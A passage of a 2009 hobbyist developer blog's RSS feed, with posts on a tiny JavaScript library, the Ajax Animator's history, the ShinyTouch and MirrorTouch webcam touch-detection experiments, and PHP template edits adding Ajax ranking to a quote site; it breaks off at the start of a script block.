&lt;p&gt;Currently, the whole framework, including Ajax, Events, URL Encoding, Animation (including Fading), Namespacing, JSON Serialization, JSON Parsing, Document onReady, HTML entities encode/decode, Array Index, Get Elements By Class Name, Object Extending, Templating, Queueing, Class Manipulation and more. is under &lt;strong&gt;3KB&lt;/strong&gt; total &lt;strong&gt;uncompressed&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;All functions are aliased to full reader-friendly names as well as very consise abbreviations. For example, Ajax can be accessed by&lt;tt&gt;&lt;em&gt;.ajax&lt;/tt&gt; or &lt;tt&gt;&lt;/em&gt;.X&lt;/tt&gt;.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Animator History</title>
      <link>http://antimatter15.com/2009/07/ajax-animator-history/</link>
      <pubDate>Sun, 12 Jul 2009 18:24:04 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/ajax-animator-history/</guid>
      <author></author>
      <description>&lt;p&gt;The Ajax Animator project started in early 2007, when I was in 6th grade. It was spawned by my interest in Flash in 2005 (because I liked expression by stickfigures and animation, and that it was one of the few ways to make applications or media for the Sony PSP) and my reluctance to pirate the Flash software after the trials expired. This intrest brought me to the liveswifers forum, which was engaging on a (as of yet and then) vaporware called OpenSwif. The idea for the Ajax Animator started when I was talking to a friend about a software program he used called Koolmoves. After making a forum post titled “Web 2.0 Flash IDE”, the project really started.&lt;/p&gt;
&lt;p&gt;The development started based on &lt;a href=&quot;http://starkravingfinkle.org/blog/2006/04/richdraw-simple-vmlsvg-editor/&quot;&gt;RichDraw&lt;/a&gt;. It actually started out as RichDraw with a different layout. It was for a very long time built around the HTML/CSS/JS that was included in the RichDraw Demo. I never really modified RichDraw while using it, just building around it. I added a “timeline” (not at that time functional) which was just a dynamically generated table counting from 0-100. I added more stuff, looking for random cool scripts that made windows, dialogs, and color pickers.&lt;/p&gt;
&lt;p&gt;Eventually, I found &lt;a href=&quot;http://www.dhtmlgoodies.com/&quot;&gt;DHTML Goodies&lt;/a&gt; (mostly for it’s color picker widget), and then used it’s DHTML Suite to rewrite the entire application. After it was rewritten, It still was totally disfunctional. I added support for manual frame-by-frame animation and then Flash export thanks to &lt;a href=&quot;http://freemovie.sourceforge.net&quot;&gt;freemovie&lt;/a&gt;. Around this time, I made a Google Code project for it and began using SVN.&lt;/p&gt;
&lt;p&gt;After looking thorugh the DHTML Suite page, I found a link to another library called &lt;a href=&quot;http://extjs.com&quot;&gt;ExtJS&lt;/a&gt;. I ported from the DHTML Suite to ExtJS 1.0. Then I versioned it 1.0. I added some pretty neat features, like tweening, sharing, and more.&lt;/p&gt;
&lt;p&gt;Later, when ExtJS 2.0 came out, I began developing the next version of the Ajax Animator. Also, realizing how incomplete the project was, the versioning scale was changed and it was now developing 0.20. It was a full rewrite from scratch. During development Ext 2.1 came out so development migrated to that version. This version polished things up a lot with newer development paradigms and a new vector drawing editor called OnlyPaths, contributed by josep_ssv. It had a new cross-platform JSON based serialized graphics format, and supported export to many different formats. One feature that was never ported to 0.2 was support for user accounts and server side storage.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ShinyTouch Progress Update + Fresnel's Equations</title>
      <link>http://antimatter15.com/2009/07/shinytouch-progress-update-fresnel-s-equations/</link>
      <pubDate>Sun, 12 Jul 2009 00:30:56 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/shinytouch-progress-update-fresnel-s-equations/</guid>
      <author></author>
      <description>&lt;p&gt;So I was looking through wikipedia to find out  if there were some magical equations to govern how it should mix the color of the background screen contents and the reflection and make the application work better. I think Fresnel’s equations fit that description. It basically gives the reflectiveness of the substance from information about the substance, the surrounding substance (air) and the angle of incidence.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Well  this image really is quite intimidating. I wont even pretend to understand it  but it looks like Fresnels equations with different values of n1 and n2 (some ratio for different temperatures). And is the plot on the right the same Total Internal Reflection in FTIR?&quot;  src=&quot;/articles/2009/ShinyTouch%20Progress%20Update%20+%20Fresnel%27s%20Equations/Fresnel2.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;A really intimidating image from none other than Wikipedia&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;It’s quite interesting, partly because the shinyness (and thus the ratios used to combine the background color with the finger to compare) depends on the angle of the webcam to the finger, which depends on the distance (yay for trigonometry?). So the value used isn’t the 50-50 ration that it currently uses in the algorithm universally, but it’s dependent on variables to Fresnel’s Equations and the distance of the finger.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;I forgot what this was supposed to describe&quot;  src=&quot;/articles/2009/ShinyTouch%20Progress%20Update%20+%20Fresnel%27s%20Equations/camhandangle-251x300.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;I forgot what this was supposed to describe&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Anyway, time for a graphic that doesn’t really explain anything because I lost my train of thought while trying to understand how to use Inkscape!&lt;/p&gt;
&lt;p&gt;So here’s something more descriptive. The two hands (at least it’s not 3, and why they’re just lines with no fingers isn’t my fault) and they’re positioned at different locations, one (hand 1) is close to the camera while the second (hand 2) is quite far away. Because of magic and trigonometry, the angle of the hand is greater when it’s further away. Also, this plugs into Fresnel’s Equations which mean the surface is shinier for where hand 2 is touching while it’s less shiny for hand 1. So the algorithm has to adjust for the variation (and if this works, then it might not need the complex region specific range values).&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Notice how Angle 2 for hand 2 is much larger than angle 1 because of how it&quot;  src=&quot;/articles/2009/ShinyTouch%20Progress%20Update%20+%20Fresnel%27s%20Equations/yayfortrig.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Yay For Trig!&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;So here it’s pretty ideal to have the angle be pretty extreme right? Those graphs sure seem imply that extreme angles are a good thing. But no, because quite interestingly, the more extreme the angle is, then the less accurate the measures from the &lt;em&gt;x&lt;/em&gt; axis become. So in the image below, you can see that &lt;em&gt;cam b&lt;/em&gt; is farther from the monitor (and thus has a greater angle from the monitor) and it can discern far more accurately depth than than &lt;em&gt;cam a&lt;/em&gt;. The field of view for &lt;em&gt;cam a&lt;/em&gt; is squished down to that very thin angle whereas the &lt;em&gt;cam b&lt;/em&gt; viewing area is far larger. Imagine if there was a &lt;em&gt;cam c&lt;/em&gt; which was mounted directly in front of the monitor, it would suffer from no compression of the &lt;em&gt;x&lt;/em&gt; axis like &lt;em&gt;a _or _b&lt;/em&gt; but instead it has full possible depth.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;the more extreme the angle is  then the lower the resolution of the usable x axis becomes. So while you get better accuracy (shinier = easier to detect) the accuracy point you can reduce it to declines proportionally.&quot;  src=&quot;/articles/2009/ShinyTouch%20Progress%20Update%20+%20Fresnel%27s%20Equations/precision.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Extreme angles have lower precision&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;So for the math portion, interestingly, the plot for the decline in % of the total possible width is equivalent to the 1-sin() (I think, but if I’m wrong then it could be cos() and i suck at math anyway).&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;So since it&quot;  src=&quot;/articles/2009/ShinyTouch%20Progress%20Update%20+%20Fresnel%27s%20Equations/oohmoretrig.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;More Trig!&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;So if you graph out 1-sin(n) then you get a curve where it starts at 100% when the angle the camera is positioned at is 0 degrees from an imaginary line perpendicular to the center of the surface, and it approaches 0% as the degree measure reaches 90 deg.&lt;/p&gt;
&lt;p&gt;So interestingly when you plot it, basically what happens is a trade-off between the angle the camera is at and the precision (% of ideal maximum horizontal resolution) and accuracy (shinyness of reflection). I had the same theory a few days ago, even before I discovered Fresnel’s Equations, though mine was more linear. I thought that it was just a point in which the values dropped for the shinyness. I thought that the reason the monitor was shinier from the side is that it was beyond the intended viewing angle, so since there is less light at the direction, the innate shinyness is more potent.&lt;/p&gt;
&lt;p&gt;So what does this mean for the project? Well, it confirms my initial thoughts that this is far too complicated for me to do alone, and makes me quite sad (partly because of the post titled Fail that was published in january). It’s really far too complicated for me. Right now the algorithm I use is very approximate (and noticably so). The formula improperly adjusts for perception and so if you try to draw a straight line across the monitor, you end up with a curved section of a sinusoidal-wave.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Trying to draw a straight line across the screen ends up looking curved because it uses a linear approximate distortion adjustment algorithm. Note that the spaces between the bars is because of the limited horizontal resolution  partly due to the angle  mostly due to hacks for how slow python is.&quot;  src=&quot;/articles/2009/ShinyTouch%20Progress%20Update%20+%20Fresnel%27s%20Equations/purty2009-07-10T191119.247602.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Issues with algorithm&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;So it’s far more complicated than I could have imagined at first, and I imagined it as far too complicated for me to venture in this alone. But I’m trying even with this sub-ideal situation. So the rest of the algorithm for now will also remain with more linear approximations. I’m going to experiment in making more linear approximations of the plot of Fresnel’s equations. And hopefully it’ll work this time.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>ShinyTouch Zero Setup Single Touch Surface Retrofitting Technology</title>
      <link>http://antimatter15.com/2009/07/shinytouch-zero-setup-single-touch-surface-retrofitting-technology/</link>
      <pubDate>Sat, 11 Jul 2009 04:01:28 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/07/shinytouch-zero-setup-single-touch-surface-retrofitting-technology/</guid>
      <author></author>
      <description>&lt;p&gt;So Mirrortouch is really nice, it’s quite accurate, very fast, quite cheap and it’s my idea :)&lt;/p&gt;
&lt;p&gt;But while trying to hook up the script to my webcam and looking at the live webcam feeds from it pointing at my monitor (aside from the awesome infinite-mirror effect!) I discovered an effect that’s quite painfully obvious but dismissed earlier: reflection.&lt;/p&gt;
&lt;p&gt;So a few months ago, I just sat in the dark with a few flashlights and a 6in square block of acrylic. I explored the multitouch technologies with them. Shining the flashlight through the side, I can replicate the FTIR (Frustrated Total Internal Reflection) effect used in almost all multitouch systems. Looking from under, with a sheet of paper over and shining the flashlight up, I can experiment with Rear DI (Diffused Illumination). Shining it from the side but above the surface, I can see the principle of LLP Laser Light Plane, actually here, it’s more accurately like LED-LP). MirrorTouch is from looking at it with one end tilted torward a mirror.&lt;/p&gt;
&lt;p&gt;If you look at a mirror, and look at it not directly on, but at an angle, however slight, you can notice that the reflection (or shadow, or virtual image whatever you want to call it) only appears comes in “contact” with the real image (the finger) when the finger is in physical contact with the reflective medium. From the diagram below, you can see the essence of the effect. When there is a touch, the reflection is to the immediate right (in this camera positioning) of the finger. If the reflection is not to the immediate right, then it is not a touch.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;From the perspective of the camera&quot;  src=&quot;/articles/2009/ShinyTouch%20Zero%20Setup%20Single%20Touch%20Surface%20Retrofitting%20Technology/ShinyTouchSketch.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;ShinyTouch Diagram&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;It’s a very very simple concept, but I disregarded it because real monitors aren’t that shiny. But when I hooked the webcam up to the monitor, it turns out it is. I have a matte display, and it’s actually really shiny from a moderately extreme angle.&lt;/p&gt;
&lt;p&gt;So I hacked the MirrorTouch code quite a bit and I have something new: ShinyTouch (for the lack of a better name). ShinyTouch takes the dream of MirrorTouch one step further by reducing setup time to practically nothing. Other than the basic unmodified webcam, it takes absolutely nothing. No mirrors, no powered light sources, no lasers, speakers, batteries, bluetooth, wiimotes, microphones, acrylic, switches, silicon, colored tape, vellum, paper, tape, glue, soldering, LEDs, light bulbs, bandpass filters, none of that. Just mount your camera at whatever looks nice and run the software.&lt;/p&gt;
&lt;p&gt;And for those who don’t really pay attention, this is more than finger tracking. A simple method of detecting the position of your fingers with no knowledge of the depth is not at all easy to use. The Wiimote method and the colored-tape methods are basically this.&lt;/p&gt;
&lt;p&gt;The sheer simplicity of the hardware component is what really makes the design attractive. However, there is a cost. It’s not multitouch capable (actually it is, but the occlusion that it suffers from will deny the ability for any commonly used multitouch gestures). It’s slower than MirrorTouch. It doesn’t work very well in super bright environments and it needs calibration.&lt;/p&gt;
&lt;p&gt;Calibration is at current stages of development, excruciatingly complicated. However, it can be simplified to be quite simple in comparison. The current one involves painful color value extraction manually from an image editor of your choice. Then it needs to run and you need to fix the color diff ranges. Before that you need to do a 4-click monitor calibration (which could theoretically be eliminated). But it could be reduced by making the camera detect a certain color pattern from the monitor to find out the corners and totally remove the 4 point clicking calibration. After that, the screen could ask you to click a certain box on the screen which would be captured pre-touch and post-touch and diff’d to get a finger RGB range. From that point, the user would be asked to follow a point as it moves around the the monitor to gather a color reflection diff range.&lt;/p&gt;
&lt;p&gt;The current algorithm is quite awesome. It searches the grid pixel-by-pixel scanning horizontally from the right to the left (not left to right). Once it finds a row of 3 pixel matches for the finger color, it stops parsing and records the point and passes it over to the reflection analysis program. There are/were 3 ways to search for the reflection. The first one I made is a simple diff between the reflection and the surrounding. It finds the difference between the color of the point immediately to the right and the point to the top-right of the finger. The idea is that if there is no reflection, then the colors should basically roughly match and if it’s not then you can roughly determine that it is a touch.&lt;/p&gt;
&lt;p&gt;This was later superseded by something that calculates the average of the color of the pixel on the top-right of the finger and the color of the finger. The average should theoretically equate the color of the reflection, so it diffs the averaged color with the color to the immediate right (the hypothetical reflection) and compares them.&lt;/p&gt;
&lt;p&gt;There was another algorithm that is really simple for when it’s very very bright (near a window or something) and the reflection is totally overshadowed (pardon the pun, it wasn’t really intended) by the finger’s shadow. So instead of looking for a reflection, it looks for a shadow, which the agorithm thinks of as just a dark patch (color below a certain threshold). That one is obvoiusly the simples, and not really reliable either.&lt;/p&gt;
&lt;p&gt;One big issue is that currently, the ranges are global, but in practice, the ranges need to vary for individual sections of the screen. So the next feature that should be implemented is dividing the context into several sections of the screen each with their own color ranges. It’s a bit more complex than the current system but totally feasable.&lt;/p&gt;
&lt;p&gt;So the current program has the ability to function as a crude paint program and some sample images are on the bottom portion of this post.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Hai!!!!&quot;  src=&quot;/articles/2009/ShinyTouch%20Zero%20Setup%20Single%20Touch%20Surface%20Retrofitting%20Technology/purty2009-07-02T184647.550169-300x225.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;purty2009-07-02T18:46:47.550169&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Yayness!&quot;  src=&quot;/articles/2009/ShinyTouch%20Zero%20Setup%20Single%20Touch%20Surface%20Retrofitting%20Technology/purty2009-07-10T192153.657122-300x225.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;purty2009-07-10T19:21:53.657122&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;:)&quot;  src=&quot;/articles/2009/ShinyTouch%20Zero%20Setup%20Single%20Touch%20Surface%20Retrofitting%20Technology/purty2009-07-10T191406.879415-300x225.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;purty2009-07-10T19:14:06.879415&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;No.&quot;  src=&quot;/articles/2009/ShinyTouch%20Zero%20Setup%20Single%20Touch%20Surface%20Retrofitting%20Technology/purty2009-07-02T184809.650197-300x225.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;purty2009-07-02T18:48:09.650197&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New MirrorTouch Algorithm</title>
      <link>http://antimatter15.com/2009/06/new-mirrortouch-algorithm/</link>
      <pubDate>Sat, 27 Jun 2009 04:25:47 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/06/new-mirrortouch-algorithm/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;MirrorTouch Diagram&quot;  src=&quot;/articles/2009/New%20MirrorTouch%20Algorithm/multitouchmain.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;MirrorTouch Diagram&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;MirrorTouch (the new name for my mirror-based multitouch system). For those who don’t remember, it is a project to create a retrofittable cheap new technology for touch detection. It can be made of mostly off-the-counter or even household items. The software has the potential to be VERY fast, many orders of magnitude faster than the current technology. It is less seceptable to occlusion than many other technologies.&lt;/p&gt;
&lt;p&gt;It began well over 2 months ago. It started out with IDEALISTIC paint sketches and then a VB.NET application to parse it. Then it was ported to Python and could handle the same sketches. After discovering that in real life the positioning of the points varies due to some very strange and illogical factor, the project had a several-month hiatus.&lt;/p&gt;
&lt;p&gt;The issue is clearly demonstrated here:&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;noooo!! why doesnt it work?!?!?!?!?!&quot;  src=&quot;/articles/2009/New%20MirrorTouch%20Algorithm/2009-04-09-093635-oops.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Oh Noes!&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Last week, I considered the project a failure. I was playing around with a flashlight and tried looking into the strange behavior of the light. And something began to dawn on me. The shape as on diagram 1, can be flattened out as a visualization for what it behaves like. So from the pyramid shape, it looks more like a little 4-pointed star. Since the mirror is only on two sides, you can simplify it to half a star emerging from a square.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;The diagram&quot;  src=&quot;/articles/2009/New%20MirrorTouch%20Algorithm/multitouchflat.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Flattened Diagram&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;To the side is a geometicalified sketch of it from my notebook. Here you can see the relation between the point and where it shows up on the mirror.&lt;/p&gt;
&lt;p&gt;From that, you can use the distance between &lt;em&gt;m&lt;/em&gt; and the y point (&lt;em&gt;y-m&lt;/em&gt;) and divide it all over the distance from the mirror to the webcam (&lt;em&gt;l&lt;/em&gt;) and plug it into &lt;em&gt;y=mx+c&lt;/em&gt; form. Repeat that over the x axis and you can use basic algebra to find the interesction.&lt;/p&gt;
&lt;p&gt;From that is the new magical formula that powers the application:&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;Yay! Purtyful!&quot;  src=&quot;/articles/2009/New%20MirrorTouch%20Algorithm/MultitouchFormulae.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Yay! Purtyful!&lt;/div&gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;The new formula is so magical that it actually works. Yes, it’s amazing, it has survived the most strictest of tests of mathematical consistency. It &lt;em&gt;works.&lt;/em&gt;…. At least in theory. Now what about &lt;em&gt;scientific&lt;/em&gt; tests? Oh no! it actually has to work in the &lt;em&gt;physical&lt;/em&gt; &lt;span style=&quot;text-decoration: underline;&quot;&gt;world&lt;/span&gt;? Oh no!&lt;/p&gt;
&lt;p&gt;With these 2 magical equations. I have (theoretically) in an idealistic model of the system, solved the issue with distortion. It should theoretically resolve all issues with the system. It should work.&lt;/p&gt;
&lt;p&gt;So i set up the model again, attaching my webcam to a ruler and taping it to a speaker. Taping mirrors down on a piece of paper, and this time, Scribbling down measurements on the side. I got it to work. Workign without resetting configuration every time it ran. It works. It truly actually works. Multi-Touch too.&lt;/p&gt;
&lt;p&gt;Since I cant get the webcam to feed directly to the python script, I have to use Cheese (it’s a linux app for taking pics from a webcam) to save screenies of the webcam mounted percariously from a ruler using only a bit of transparent Scotch tape. I copy the images over to the mirrortouch directory and go in the commandline and type in &lt;em&gt;python process.py&lt;/em&gt; and watch as lines of logging output fly past as the windows autoscrolls down filled with coordinates and color hashes.&lt;/p&gt;
&lt;p&gt;I watch as it generates a .png file.&lt;/p&gt;
&lt;p&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;It works in the _real_ world!&quot;  src=&quot;/articles/2009/New%20MirrorTouch%20Algorithm/ScanOut-4.png&quot; &gt;&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Yes it works! AMAZING!&lt;/p&gt;
&lt;p&gt;Note: The random scribbles in the back aren’t for any contstructive purpose. No, actually they just stop my stupid webcam from adjusting the contrast and making everything all ugly and ewwie. If my webcam sucked less than maybe it would work but my webcam really does really really really suck.&lt;/p&gt;
&lt;p&gt;Now if it could get ported over to somethign like C++, and actually parse a live video feed from the webcam then it may become an actual working implementable multitouch technology. As it stands, it’s just a multitouch proof of concept, and I don’t know C++ so it probably won’t work.&lt;/p&gt;
&lt;p&gt;Anyone dying for the source code can find it in the SVN repository at : &lt;a href=&quot;http://code.google.com/p/mirrortouch/&quot;&gt;http://code.google.com/p/mirrortouch/&lt;/a&gt; Just beware that it may take &lt;span style=&quot;text-decoration: underline;&quot;&gt;lots&lt;/span&gt; of scary and tedious configuring in current stages (Configuring color range of background in the band, configuring color range of target, setting distances and middle length and other horrors, but from the SVN you can also do the insanely boring act of running various images that are already there through the script, and most of the images just wont work even with replacing huge blocks of code).&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Ajax Ranking in Rash QMS</title>
      <link>http://antimatter15.com/2009/06/ajax-ranking-in-rash-qms/</link>
      <pubDate>Fri, 19 Jun 2009 23:10:04 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2009/06/ajax-ranking-in-rash-qms/</guid>
      <author></author>
      <description>&lt;p&gt;So i had this little project involving a quote repository and due to some trouble installing the superior Chirpy system, I used RQMS and did a few changes to add features like ajax ranking so you don’t have to reload to rank something.&lt;/p&gt;
&lt;p&gt;It only involved changing less than 10 lines and pasting a snippet of my vX Ajax library.&lt;/p&gt;
&lt;p&gt;Replace lines 151, 152 and 153 with the following lines (respectively) in rash_output.php (the template).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;?ratingplus&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?&lt;/span&gt;=&lt;span class=&quot;hljs-variable&quot;&gt;$GET_SEPARATOR_HTML&lt;/span&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;id=&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?&lt;/span&gt;=&lt;span class=&quot;hljs-variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'id'&lt;/span&gt;]&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;onclick&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;plus(&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?&lt;/span&gt;=&lt;span class=&quot;hljs-variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'id'&lt;/span&gt;]&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;);return false&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;quote_ratingplus&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;+&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;
(&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;span&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;rating&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?&lt;/span&gt;=&lt;span class=&quot;hljs-variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'id'&lt;/span&gt;]&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?&lt;/span&gt;=&lt;span class=&quot;hljs-variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'rating'&lt;/span&gt;]&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;span&lt;/span&gt;&amp;gt;&lt;/span&gt;)
&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;?ratingminus&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?&lt;/span&gt;=&lt;span class=&quot;hljs-variable&quot;&gt;$GET_SEPARATOR_HTML&lt;/span&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;id=&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?&lt;/span&gt;=&lt;span class=&quot;hljs-variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'id'&lt;/span&gt;]&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;onclick&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;minus(&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;&amp;lt;?&lt;/span&gt;=&lt;span class=&quot;hljs-variable&quot;&gt;$row&lt;/span&gt;[&lt;span class=&quot;hljs-string&quot;&gt;'id'&lt;/span&gt;]&lt;span class=&quot;hljs-preprocessor&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;);return false&quot;&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;class&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;quote_ratingminus&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;-&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then add the following somewhere arbitrary in the &lt;head&gt; of rash_template.php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;
&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; _=_?_:{}
